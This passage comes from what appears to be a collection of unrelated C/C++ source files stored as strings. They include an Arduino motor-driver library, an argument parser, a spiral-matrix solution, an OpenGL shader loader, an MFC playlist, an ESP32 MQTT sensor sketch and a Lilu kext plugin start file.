== 1) {\n    hardwareSerial = true;\n    Serial.begin(baudrate);\n    while (!Serial);\n    //delay(1000);\n    //Serial.write(0x80);\n  }\n  else {\n    hardwareSerial = false;\n    pinMode(_txPin, OUTPUT);\n    MDDSSerial = new SoftwareSerial(_rxPin, _txPin);\n    MDDSSerial->begin(baudrate);\n    //delay(1000);\n    //MDDSSerial->write(0x80);\n  }\n}\n\nvoid Cytron_SmartDriveDuo::initialByte(uint8_t dummyByte)\n{\n  if (hardwareSerial == true) {\n    Serial.write(dummyByte);\n  }\n  else {\n    MDDSSerial->write(dummyByte);\n  }\n}\n\nvoid Cytron_SmartDriveDuo::control(signed int motorLSpeed, signed int motorRSpeed)\n{\n  switch (_mode) {\n    case RC_MCU:\n      if (motorLSpeed >= 0) {\n        if (motorLSpeed > 100) motorLSpeed = 100;\n        rc1Delay = map(motorLSpeed, 0, 100, 1500, 2480);\n        digitalWrite(_rc1Pin, HIGH);\n        delayMicroseconds(rc1Delay);\n        digitalWrite(_rc1Pin, LOW);\n      }\n      else if (motorLSpeed < 0) {\n        if (motorLSpeed < -100) motorLSpeed = -100;\n        rc1Delay = map(motorLSpeed, -100, 0, 500, 1500);\n        digitalWrite(_rc1Pin, HIGH);\n        delayMicroseconds(rc1Delay);\n        digitalWrite(_rc1Pin, LOW);\n      }\n\n      if (motorRSpeed >= 0) {\n        if (motorRSpeed > 100) motorRSpeed = 100;\n        rc2Delay = map(motorRSpeed, 0, 100, 1500, 2480);\n        digitalWrite(_rc2Pin, HIGH);\n        delayMicroseconds(rc2Delay);\n        digitalWrite(_rc2Pin, LOW);\n      }\n      else if (motorRSpeed < 0) {\n        if (motorRSpeed < -100) motorRSpeed = -100;\n        rc2Delay = map(motorRSpeed, -100, 0, 500, 1500);\n        digitalWrite(_rc2Pin, HIGH);\n        delayMicroseconds(rc2Delay);\n        digitalWrite(_rc2Pin, LOW);\n      }\n      break;\n\n    case PWM_INDEPENDENT:\n      if (motorLSpeed >= 0) {\n        if (motorLSpeed > 100) motorLSpeed = 100;\n        motorLSpeed = motorLSpeed * 2.55;\n        analogWrite(_an1Pin, motorLSpeed);\n        digitalWrite(_in1Pin, LOW);\n      }\n      else if (motorLSpeed < 0) {\n        if (motorLSpeed < -100) motorLSpeed = -100;\n        motorLSpeed = motorLSpeed * -2.55;\n        analogWrite(_an1Pin, motorLSpeed);\n        digitalWrite(_in1Pin, HIGH);\n      }\n      \n      if (motorRSpeed >= 0) {\n        if (motorRSpeed > 100) motorRSpeed = 100;\n        motorRSpeed = motorRSpeed * 2.55;\n        analogWrite(_an2Pin, motorRSpeed);\n        digitalWrite(_in2Pin, HIGH);\n      }\n      else if (motorRSpeed < 0) {\n        if (motorRSpeed < -100) motorRSpeed = -100;\n        motorRSpeed = motorRSpeed * -2.55;\n        analogWrite(_an2Pin, motorRSpeed);\n        digitalWrite(_in2Pin, LOW);\n      }\n      break;\n\n    case SERIAL_SIMPLIFIED:\n      if (motorLSpeed >= 0) {\n        commandByte = 0;\n        _motorLSpeed = map(motorLSpeed, 0, 100, 0, 63);\n      }\n      else if (motorLSpeed < 0) {\n        commandByte = 0x40;\n        _motorLSpeed = map(motorLSpeed, 0, -100, 0, 63);\n      }\n      commandByte = commandByte | _motorLSpeed;\n      if (hardwareSerial == true) {\n        Serial.write(commandByte);\n      }\n      else {\n        MDDSSerial->write(commandByte);\n      }\n\n      if (motorRSpeed >= 0) {\n        commandByte = 0xC0;\n        _motorRSpeed = map(motorRSpeed, 0, 100, 0, 63);\n      }\n      else if (motorRSpeed < 0) {\n        commandByte = 0x80;\n        _motorRSpeed = map(motorRSpeed, 0, -100, 0, 63);\n      }\n      commandByte = commandByte | _motorRSpeed;\n      if (hardwareSerial == true) {\n        Serial.write(commandByte);\n      }\n      else {\n        MDDSSerial->write(commandByte);\n      }\n      break;\n\n    case SERIAL_PACKETIZED:\n      // Left motor\n      addressByte = _boardId;\n      commandByte = map(motorLSpeed, -100, 100, 0, 255);\n      checksum = headerByte + addressByte + commandByte;\n      if (hardwareSerial == true) {\n        Serial.write(headerByte);\n        Serial.write(addressByte);\n        Seria",
    "\n#include \"parser.h\"\n\n#include <functional>\n#include <string>\n#include <map>\n#include <vector>\n\n#include <iostream>\n\nusing namespace fparser;\n\nParser::Parser() {\n\n}\n\nParser::~Parser() {\n\n}\n\nvoid Parser::add_command(std::string key, \n                         fparser::Function function, \n                         int min_parameter_count, \n                         int max_parameter_count\n                        ) {\n    this->commands.insert({key, {function, min_parameter_count, max_parameter_count}});\n}\n\nfparser::Map Parser::parse(int argc, char *argv[]) {\n    fparser::Map results;\n\n    for (int i = 0; i != argc; i++) {\n        \n        std::string key(argv[i]);\n        if (this->commands.contains(key)) {\n            command cmnd = this->commands[key];\n            std::vector<std::string> parameters;\n\n            // Parse parameters into vector parameters\n            for (int j = 0; j < cmnd.max_parameter_count; j++) {\n\n                // Quit if the command's max parameter count goes beyond the argument count\n                if (i+j+1 >= argc) {break;} \n\n                std::string parameter(argv[i+j+1]);\n\n                // Quit if the current argument is a key\n                if (this->commands.contains(parameter)) {break;}\n\n                parameters.push_back(parameter);\n            }\n\n            // Return empty map if a command has too few arguments\n            if (parameters.size() < cmnd.min_parameter_count) {\n                std::cout << \"Invalid number of arguments for command \" \n                          << key \n                          << \" (Minimum of \" \n                          << cmnd.min_parameter_count \n                          << \").\" \n                          << std::endl;\n                return {};\n            } \n\n            results.insert({key, this->commands[key].function(parameters)});\n        }\n    }\n\n    return results;\n}\n",
    "class Solution {\npublic:\n    void check(vector<vector<int>>& matrix, int& top, int& bottom, int& left,\n               int& right, vector<int>& ans) {\n        // Traverse from left to right along the top row\n        for (int i = left; i <= right; i++) {\n            ans.push_back(matrix[top][i]);\n        }\n        top++; // Move the top boundary down\n\n        // Traverse from top to bottom along the right column\n        for (int i = top; i <= bottom; i++) {\n            ans.push_back(matrix[i][right]);\n        }\n        right--; // Move the right boundary left\n\n        // Traverse from right to left along the bottom row\n        if (top <= bottom) {\n            for (int i = right; i >= left; i--) {\n                ans.push_back(matrix[bottom][i]);\n            }\n            bottom--; // Move the bottom boundary up\n        }\n\n        // Traverse from bottom to top along the left column\n        if (left <= right) {\n            for (int i = bottom; i >= top; i--) {\n                ans.push_back(matrix[i][left]);\n            }\n            left++; // Move the left boundary right\n        }\n    }\n\n    vector<int> spiralOrder(vector<vector<int>>& matrix) {\n        if (matrix.empty() || matrix[0].empty()) return {}; // Handle empty matrix case\n\n        int n = matrix.size();\n        int m = matrix[0].size();\n\n        vector<int> ans;\n        int top = 0, bottom = n - 1;\n        int left = 0, right = m - 1;\n\n        while (top <= bottom && left <= right) {\n            check(matrix, top, bottom, left, right, ans);\n        }\n\n        return ans;\n    }\n};\n",
    "#include <cctype>\n#include <filesystem>\n#include <format>\n#include <fstream>\n#include <iostream>\n\n#include \"CoreDSL2BaseListener.h\"\n#include \"CoreDSL2BaseVisitor.h\"\n#include \"CoreDSL2Lexer.h\"\n#include \"CoreDSL2Parser.h\"\n#include \"antlr4-runtime.h\"\n\n#include \"bg.h\"\n\n\nnamespace std {\n    template<>\n    struct hash<std::pair<OperationType, OperandType>> {\n        size_t operator()(const std::pair<OperationType, OperandType>& pair) const {\n            auto [opType, operandType] = pair;\n            return hash<OperationType>()(opType) ^ (hash<OperandType>()(operandType) << 1);\n        }\n    };\n}\n\nstd::unordered_map<OperandType, std::string> operand_type_name_map = {\n    {OperandType::FLOAT, \"float\"},\n    {OperandType::DOUBLE, \"double\"},\n    {OperandType::SCOMPLEX, \"scomplex\"},\n    {OperandType::DCOMPLEX, \"dcomplex\"},\n};\n\nstd::unordered_map<OperandType, std::string> operand_type_code_map = {\n    {OperandType::FLOAT, \"s\"},\n    {OperandType::DOUBLE, \"d\"},\n    {OperandType::SCOMPLEX, \"c\"},\n    {OperandType::DCOMPLEX, \"z\"},\n};\n\nstd::unordered_map<OperationType, std::string> operation_prototype_macro_map = {\n    {OperationType::ADDV, \"ADDV_KER_PROT\"},\n    {OperationType::AMAXV, \"AMAXV_KER_PROT\"},\n};\n\nstd::unordered_map<OperationType, std::string> operation_function_map = {\n    {OperationType::ADDV, \"addv\"},\n    {OperationType::AMAXV, \"amaxv\"},\n    {OperationType::AXPYV, \"axpyv\"},\n};\n\nstd::unordered_map<OperationType, std::string> operation_signature_map = {\n    {OperationType::ADDV, \"void bli_{0}addv_(conj_t conjx, dim_t n, const void* x, inc_t incx, void* y, inc_t incy, const cntx_t* cntx)\"},\n    {OperationType::AMAXV, \"void bli_{0}amaxv_(dim_t n, const void* x, inc_t incx, dim_t* index, const cntx_t* cntx)\"},\n    {OperationType::AXPYV, \" void bli_{0}axpyv ( conj_t  conjx, dim_t   n, void*  alpha, void*  x, inc_t incx, void*  y, inc_t incy);\"},\n};\n\nstring to_upper(string str) {\n    std::transform(str.begin(), str.end(), str.begin(),\n                   [](unsigned char c) { return std::toupper(c); });\n    return str;\n}\n\nstring trim_left_whitespace(string str) {\n    std::istringstream iss(str);\n    std::ostringstream oss;\n    string line;\n    size_t min_indent = string::npos;\n    std::vector<string> lines;\n\n    // min indentation\n    while (std::getline(iss, line)) {\n        if (!line.empty() && line.find_first_not_of(\" \\t\") != string::npos) {\n            size_t first_non_space = line.find_first_not_of(\" \\t\");\n            min_indent = (min_indent == string::npos)\n                             ? first_non_space\n                             : std::min(min_indent, first_non_space);\n        }\n        lines.push_back(line);\n    }\n\n    for (const auto &l : lines) {\n        if (!l.empty()) {\n            oss << (min_indent != string::npos && min_indent < l.size()\n                        ? l.substr(min_indent)\n                        : \"\")\n                << '\\n';\n        }\n    }\n\n    return oss.str();\n}\n\n\nvoid write_file(const SourceFile &file) {\n    std::filesystem::create_directories(file.file_path.parent_path());\n    std::ofstream f(file.file_path);\n    if (f.is_open()) {\n        f << file.content;\n        f.close();\n    } else {\n        std::cerr << \"Failed to open file: \" << file.file_path << std::endl;\n    }\n}\n\n\nvoid generate_patches(const BlisKernel &kernel) {\n    auto patch_dir = kernel.base_dir / \"patches\";\n\n    SourceFile bli_arch = {\n        .file_path = patch_dir / \"bli_arch.c.patch\",\n        .content = trim_left_whitespace(format(R\"(\n        --- a/frame/base/bli_arch.c\n        +++ b/frame/base/bli_arch.c\n        @@ -292,0 +292,3 @@\n        +#ifdef BLIS_FAMILY_{0}\n        +id = BLIS_ARCH_{0};\n        +#endif\n      )\",\n                                               to_upper(kernel.name))),\n    };\n    write_file(bli_arch);\n\n    SourceFile bli_cpuid = {\n        .file_path = patch_dir / \"bli_cpuid.c.patch\",\n        .content =\n            trim_left_whitespace(format(R\"(\n        --- a/frame/base/bli_cpuid.c\n        +++ b/frame/base/bli_cpuid.c\n        @@ -158,0 +158,4 @@\n        +#ifdef BLIS_CONFIG_{0}\n        +    if ( bli_cpuid_is_{1} (family, model, features)))\n        +        return BLIS_ARCH_{0};\n        +#endif\n    )\",\n                                        to_upper(kernel.name), kernel.name)),\n    };\n    write_file(bli_cpuid);\n\n    SourceFile bli_arch_config = {\n        .file_path = patch_dir / \"bli_arch_config.h.patch\",\n        .content =\n            trim_left_whitespace(format(R\"(\n      --- a/frame/include/bli_arch_config.h\n      +++ b/frame/include/bli_arch_config.h\n      @@ -283,0 +283,7 @@\n      +#ifdef BLIS_FAMILY_{1}\n      +    #include \"bli_family_{0}.h\"\n      +#endif\n      +\n      +#ifdef BLIS_KERNELS_{1}\n      +   #include \"bli_kernels_{0}.h\"\n      +#endif\n    )\",\n                                        kernel.name, to_upper(kernel.name))),\n    };\n    write_file(bli_arch_config);\n\n    SourceFile bli_gentconf_macro_defs = {\n        .file_path = patch_dir / \"bli_gentconf_macro_defs.h.patch\",\n        .cont",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <vector>\n\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n\nunsigned int make_module(const std::string& filepath, unsigned int module_type) {\n\n\tstd::ifstream file;\n\tstd::stringstream bufferedLines;\n\tstd::string line;\n\n\tfile.open(filepath);\n\twhile (std::getline(file, line)) {\n\t\t//std::cout << line << std::endl;\n\t\tbufferedLines << line << '\\n';\n\t}\n\tstd::string shaderSource = bufferedLines.str();\n\tconst char* shaderSrc = shaderSource.c_str();\n\tbufferedLines.str(\"\");\n\tfile.close();\n\n\tunsigned int shaderModule = glCreateShader(module_type);\n\tglShaderSource(shaderModule, 1, &shaderSrc, NULL);\n\tglCompileShader(shaderModule);\n\n\tint success;\n\tglGetShaderiv(shaderModule, GL_COMPILE_STATUS, &success);\n\tif (!success) {\n\t\tchar errorLog[1024];\n\t\tglGetShaderInfoLog(shaderModule, 1024, NULL, errorLog);\n\t\tstd::cout << \"Shader Module compilation error:\\n\" << errorLog << std::endl;\n\t}\n\n\treturn shaderModule;\n}\n\nunsigned int make_shader(const std::string& vertex_filepath, const std::string& fragment_filepath) {\n\n\t//To store all the shader modules\n\tstd::vector<unsigned int> modules;\n\n\t//Add a vertex shader module\n\tmodules.push_back(make_module(vertex_filepath, GL_VERTEX_SHADER));\n\n\t//Add a fragment shader module\n\tmodules.push_back(make_module(fragment_filepath, GL_FRAGMENT_SHADER));\n\n\t//Attach all the modules then link the program\n\tunsigned int shader = glCreateProgram();\n\tfor (unsigned int shaderModule : modules) {\n\t\tglAttachShader(shader, shaderModule);\n\t}\n\tglLinkProgram(shader);\n\n\t//Check the linking worked\n\tint success;\n\tglGetProgramiv(shader, GL_LINK_STATUS, &success);\n\tif (!success) {\n\t\tchar errorLog[1024];\n\t\tglGetProgramInfoLog(shader, 1024, NULL, errorLog);\n\t\tstd::cout << \"Shader linking error:\\n\" << errorLog << '\\n';\n\t}\n\n\t//Modules are now unneeded and can be freed\n\tfor (unsigned int shaderModule : modules) {\n\t\tglDeleteShader(shaderModule);\n\t}\n\n\treturn shader;\n\n}\n",
    "// Playlist.cpp : implementation file\n//\n\n#include \"stdafx.h\"\n#include \"PlaylistBox.h\"\n#include \"Playlist.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#undef THIS_FILE\nstatic char THIS_FILE[] = __FILE__;\n#endif\n\n/*ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\nZZ  \nZZ   Class ColoScheme Inplementation\nZZ\nZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ*/\n\nCPlaylist::ColorScheme::ColorScheme() {\n\n}// end default constructor\n\nCPlaylist::ColorScheme::ColorScheme(\tCOLORREF rectBg,\n\t\t\t\t\t\t\tCOLORREF rectHiLight,\n\t\t\t\t\t\t\tCOLORREF titleNormal,\n\t\t\t\t\t\t\tCOLORREF titleHiLight,\n\t\t\t\t\t\t\tCOLORREF detailNormal,\n\t\t\t\t\t\t\tCOLORREF detailHiLight\n\t\t\t\t\t\t) {\n\tm_RectBg\t\t= rectBg;\n\tm_RectHiLight\t= rectHiLight;\n\n\tm_TitleNormal\t= titleNormal;\n\tm_TitleHiLight\t= titleHiLight;\n\n\tm_DetailNormal\t= detailNormal;\n\tm_DetailHiLight\t= detailHiLight;\n\n}// end ColorScheme constructor\n\nCPlaylist::ColorScheme::~ColorScheme() {\n\n}// end destructor\n\nCOLORREF CPlaylist::ColorScheme::GetRectBg() {\n\treturn m_RectBg;\n}// end getRectBg\n\nCOLORREF CPlaylist::ColorScheme::GetRectHiLight() {\n\treturn m_RectHiLight;\n}// end getRectHiLight\n\nCOLORREF CPlaylist::ColorScheme::GetTitleNormal() {\n\treturn m_TitleNormal;\n}// end getTitleNormal\n\nCOLORREF CPlaylist::ColorScheme::GetTitleHiLight() {\n\treturn m_TitleHiLight;\n}// end getTitleHiLight\n\nCOLORREF CPlaylist::ColorScheme::GetDetailNormal() {\n\treturn m_DetailNormal;\n}// end getDetailNormal\n\nCOLORREF CPlaylist::ColorScheme::GetDetailHiLight() {\n\treturn m_DetailHiLight;\n}// end getDetailHiLight\n\n/*ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ\nZZ  \nZZ   Class CPlaylist Inplementation\nZZ\nZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ*/\n\nCPlaylist::CPlaylist()\n{\n\t// Apply color scheme\n\tColorScheme cs( ::GetSysColor( COLOR_WINDOW ),\t\t// item background color\n\t\t\t\t\tRGB( 255, 254, 223 ),\t\t\t\t// item hi-light color\n\t\t\t\t\tRGB( 62, 65, 71 ),\t\t\t\t\t// track normal color\n\t\t\t\t\tRGB( 62, 65, 71 ),\t\t\t\t\t// track hi-light color\n\t\t\t\t\tRGB( 223, 186, 105 ),\t\t\t\t// detail normal color\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\tRGB( 223, 186, 105 )\t\t\t\t// detail hi-light color\n\t\t\t\t  );\n\tSetColorScheme( cs );\n\n\t// Apply fonts\n\tm_FontTitle.CreatePointFont( 100, \"Lucida Sans Unicode\" );\n\tm_FontDetail.CreatePointFont( 85, \"Tahoma\" );\n\n\tm_nSelected = NONE_TRACK;\n}\n\nCPlaylist::~CPlaylist()\n{\n\t// clean up GDI Object\n\tm_FontTitle.DeleteObject();\n\tm_FontDetail.DeleteObject();\n}\n\n\nBEGIN_MESSAGE_MAP(CPlaylist, CListBox)\n\t//{{AFX_MSG_MAP(CPlaylist)\n\tON_WM_LBUTTONDOWN()\n\tON_WM_LBUTTONDBLCLK()\n\tON_WM_MOUSEMOVE()\n\tON_WM_ERASEBKGND()\n\tON_COMMAND(ID_LISTOPTION_SAVEPLAYLIST, OnListoptionSaveplaylist)\n\t//}}AFX_MSG_MAP\nEND_MESSAGE_MAP()\n\n/////////////////////////////////////////////////////////////////////////////\n// CPlaylist message handlers\n\n/*zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\nz   - Scan & add all supported file in a given directory.\nz   - No recursive.\nzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz*/\nvoid CPlaylist::AddDir(CString path)\n{\n\n\tCFileFind finder;\n\tBOOL bWorking = FALSE;\n\tCString filePathName;\n\t::SetCurrentDirectory( path );\n\t\n\t// begin scanning\n\tfor( int i = 0; i < NUM_SUPPORTED; i++ ) {\n\n\t\tbWorking = finder.FindFile( SupportedFileList[ i ].lpszType );\n\t\twhile( bWorking ) {\n\n\t\t\tbWorking = finder.FindNextFile();\n\t\t\tfilePathName.Format( finder.GetFilePath() );\n\t\t\tAddTrack( filePathName );\n\t\t}// end scanning files\n\t}// end scanning all supported file types\n}// end function AddDir\n\n\n/*zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\nz   - Convert a CString to LPTSTR struct\nzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz*/\n\nLPTSTR CPlaylist::CloneString(CString string)\n{\n\tint sizeOfString =  string.GetLength() + 1;\n\t\n\t// contruct a new LPTSTR\n\tLPTSTR lpszText = new TCHAR[ sizeOfString ];\n\t_tcscpy( lpszText, string );\n\n\treturn lpszText;\n}// end function CloneString(\n\n\n///////////\n// Set pointer to parent dialog\n/////\nvoid CPlaylist::SetParent(CDialog *pDlg) {\n\tpParentDlg = pDlg;\n}// end function SetParent\n\n\n/*zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\nz  - Remove a track & free up track's data.\t\nzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz*/\n\nvoid CPlaylist::RemoveTrack(int nIndex) {\n\tif( nIndex >= 0 && nIndex < GetCount() ) {\n\t\t// if list will be empty after removing\n\t\t// remove selected\n\t\tif( GetCount() == 1 ) {\n\t\t\tSetSelectedTrack( NONE_TRACK );\n\t\t}\n\t\t// if remove the selected track \n\t\t// set seleted track to the previous track\n\t\telse if( nIndex == GetSelectedTrack() ) {\n\t\t\tif( nIndex > 0 )\n\t\t\t\tSetSelectedTrack( GetPreTrack( nIndex ) );\n\t\t}\n\t\t// if the track is above the selected track\n\t\t// adjust the selected track\n\t\telse if( nIndex < GetSelectedTrack() ) {\n\t\t\tSetSelectedTrack( GetSelectedTrack() - 1 );\n\t\t}\n\n\t\tLPTRACKDATA lpTemp = GetTrackData( nIndex );\n\t\tDeleteString( nIndex );\n\t\tdelete lpTemp;\n\t}\n}// end function Re",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <MQTTPubSubClient.h>\n#include <HardwareSerial.h>\n#include <Wire.h>\n#include \"Adafruit_VL53L0X.h\"\n\n#include \"../include/config.h\"\n\nvoid MQTTcallback(char* topic, byte* payload, unsigned int length);\nvoid connectToWifi();\nvoid connectToMQTT();\n\nWiFiClient wifiClient;\nMQTTPubSubClient mqtt;\nHardwareSerial mySerial(1);\n// Create an instance of the sensor\nAdafruit_VL53L0X tof = Adafruit_VL53L0X();\n\n#define RX_PIN 16 \n#define TX_PIN 17  \n#define I2C_SDA 20\n#define I2C_SCL 21\n\nvoid setup() {\n  Serial.begin(115200);\n  mySerial.begin(9600, SERIAL_8N1, RX_PIN, TX_PIN);\n  mySerial.println(\"test\");\n  Wire.begin(I2C_SDA, I2C_SCL);\n\n   // Initialize the sensor with the new I2C address\n  if (!tof.begin(0x29)) {\n    mySerial.println(\"Failed to find the sensor\");\n    while (1);  // Halt execution if sensor is not found\n  }\n\n  mySerial.println(\"Sensor Initialized!\");\n\n  connectToWifi();\n\n  wifiClient.connect(MQTT_SERVER, MQTT_PORT);\n\n  mqtt.begin(wifiClient);\n\n  connectToMQTT();\n\n  mqtt.subscribe([](const String& topic, const String& payload, const size_t size) {\n        mySerial.println(\"mqtt received: \" + topic + \" - \" + payload);\n    });\n\n  mqtt.publish(\"esp32\", \"Hello from ESP32\");\n  \n\n  mySerial.println(\"test\");\n}\n\nvoid loop() {\n  if (WiFi.status() != WL_CONNECTED) {\n    connectToWifi();\n  }\n\n  if (!mqtt.isConnected()) {\n    connectToMQTT();\n  }\n\n  mqtt.update();\n  mySerial.println(\"loop\");\n  VL53L0X_RangingMeasurementData_t measure;\n\n  // Read the sensor data\n  tof.rangingTest(&measure, false);\n  \n  // Display the distance measurement\n  if (measure.RangeStatus != 4) {  // 4 means out of range\n    Serial.print(\"Distance (mm): \");\n    Serial.println(measure.RangeMilliMeter);\n  } else {\n    Serial.println(\"Out of range\");\n  }\n  \n  delay(100);  \n}\n\nvoid MQTTcallback(char* topic, byte* payload, unsigned int length) {\n  Serial.print(\"Message arrived [\");\n  Serial.print(topic);\n  Serial.print(\"] \");\n  for (int i = 0; i < length; i++) {\n    Serial.print((char)payload[i]);\n  }\n  Serial.println();\n}\n\nvoid connectToWifi() {\n    Serial.print(\"Connecting to WiFi...\");\n    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n    while (WiFi.status() != WL_CONNECTED) {\n        Serial.print(\".\");\n        delay(1000);\n    }\n    Serial.println(\" connected!\");\n}\n\nvoid connectToMQTT() {\n    Serial.print(\"Connecting to MQTT...\");\n    while (!mqtt.connect(\"esp32\")) {  // Use a client ID here\n        Serial.print(\".,\");\n        delay(1000);\n    }\n    Serial.println(\" connected!\");\n}\n",
    "//\n//  plugin_start.cpp\n//  Lilu\n//\n//  Copyright \u00a9 2016-2017 vit9696. All rights reserved.\n//\n\n#include <Headers/plugin_start.hpp>\n#include <Headers/kern_api.hpp>\n#include <Headers/kern_util.hpp>\n#include <Headers/kern_version.hpp>\n\n#ifndef LILU_CUSTOM_KMOD_INIT\nbool ADDPR(startSuccess) = false;\n#else\n// Workaround custom kmod code and enable by default\nbool ADDPR(startSuccess) = true;\n#endif /* LILU_CUSTOM_KMOD_INIT */\n\nbool ADDPR(debugEnabled) = false;\nuint32_t ADDPR(debugPrintDelay) = 0;\n\n#ifndef LILU_CUSTOM_IOKIT_INIT\n\nOSDefineMetaClassAndStructors(PRODUCT_NAME, IOService)\n\nPRODUCT_NAME *ADDPR(selfInstance) = nullptr;\n\nIOService *PRODUCT_NAME::probe(IOService *provider, SInt32 *score) {\n\tADDPR(selfInstance) = this;\n\tsetProperty(\"VersionInfo\", kextVersion);\n\tauto service = IOService::probe(provider, score);\n\treturn ADDPR(startSuccess) ? service : nullptr;\n}\n\nbool PRODUCT_NAME::start(IOService *provider) {\n\tADDPR(selfInstance) = this;\n\tif (!IOService::start(provider)) {\n\t\tSYSLOG(\"init\", \"failed to start the parent\");\n\t\treturn false;\n\t}\n\n\treturn ADDPR(startSuccess);\n}\n\nvoid PRODUCT_NAME::stop(IOService *provider) {\n\tADDPR(selfInstance) = nullptr;\n\tIOService::stop(provider);\n}\n\n#endif /* LILU_CUSTOM_IOKIT_INIT */\n\n#ifndef LILU_CUSTOM_KMOD_INIT\n\nEXPORT extern \"C\" kern_return_t ADDPR(kern_start)(kmod_info_t *, void *) {\n\t// This is an ugly hack necessary on some systems where buffering kills most of debug output.\n\tlilu_get_boot_args(\"liludelay\", &ADDPR(debugPrintDelay), sizeof(ADDPR(debugPrintDelay)));\n\n\tauto error = lilu.requestAccess();\n\tif (error == LiluAPI::Error::NoError) {\n\t\terror = lilu.shouldLoad(ADDPR(config).product, ADDPR(config).version, ADDPR(config).runmode, ADDPR(config).disableArg, ADDPR(config).disableArgNum,\n\t\t\t\t\t\t\t\tADDPR(config).debugArg, ADDPR(config).debugArgNum, ADDPR(config).betaArg, ADDPR(config).betaArgNum, ADDPR(config).minKernel,\n\t\t\t\t\t\t\t\tADDPR(config).maxKernel, ADDPR(debugEnabled));\n\n\t\tif (error == LiluAPI::Error::NoError) {\n\t\t\tDBGLOG(\"init\", \"%s bootstrap %s\", xStringify(PRODUCT_NAME), kextVersion);\n\t\t\t(void)kextVersion;\n\t\t\tADDPR(startSuccess) = true;\n\t\t\tADDPR(config).pluginStart();\n\t\t} else {\n\t\t\tSYSLOG(\"init\", \"parent said we should not continue %d\", error);\n\t\t}\n\n\t\tlilu.releaseAccess();\n\t} else {\n\t\tSYSLOG(\"init\", \"failed to call parent %d\", error);\n\t}\n\t\n\tfor (size_t i = 0; i < ADDPR(config).debugArgNum; i++) {\n\t\tif (checkKernelArgument(ADDPR(config).debugArg[i])) {\n\t\t\tADDPR(debugEnabled) = true;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (checkKernelArgument(\"-liludbgall\"))\n\t\tADDPR(debugEnabled) = true;\n\n\t// Report success but actually do not start and let I/O Kit unload us.\n\t// This works better and increases boot speed in some cases.\n\treturn KERN_SUCCESS;\n}\n\nEXPORT extern \"C\" kern_return_t ADDPR(kern_stop)(kmod_info_t *, void *) {\n\t// It is not safe to unload Lilu plugins unless they were disabled!\n\treturn ADDPR(startSuccess) ? KERN_FAILURE : KERN_SUCCESS;\n}\n\n#endif /* LILU_CUSTOM_KMOD_INIT */\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled14\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include\"Application.h\"\n#include \"Window.h\"\nApplication* Application::instancePtr = nullptr;\n\nApplication::Application() :\n\tdeltaTime(0.0f), lastFrame(0.0f),\n\twindow(\"Mall\", Window::getWidth(), Window::getHeight()),\n\tmyImGui(Window::getWidth(), Window::getHeight())\n{\n\tspdlog::info(\"Starting Application\");\n\tinstancePtr = this;\n}\n\nApplication::~Application()\n{\n\n\tinstancePtr = nullptr;\n}\n\nvoid Application::run() {\n\n\n\tSetupBasics();\n\twhile (!window.shouldClose()) {\n\n\t\tClear();\n\t\tUpdateDeltaTime();\n\t\tprocessContinuousInput();\n\t\tscene.draw();\n\t\tglfwPollEvents();\n\t\t//LoadImGui();\n\t\twindow.swapBuffers();\n\t}\n\n}\n\nvoid Application::SetupBasics()\n{\n\tGLCall(glEnable(GL_DEPTH_TEST));\n\tGLCall(glEnable(GL_BLEND));\n\tGLCall(glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA));\n}\n\nvoid Application::Clear()\n{\n\tGLCall(glClearColor(0.1f, 0.1f, 0.1f, 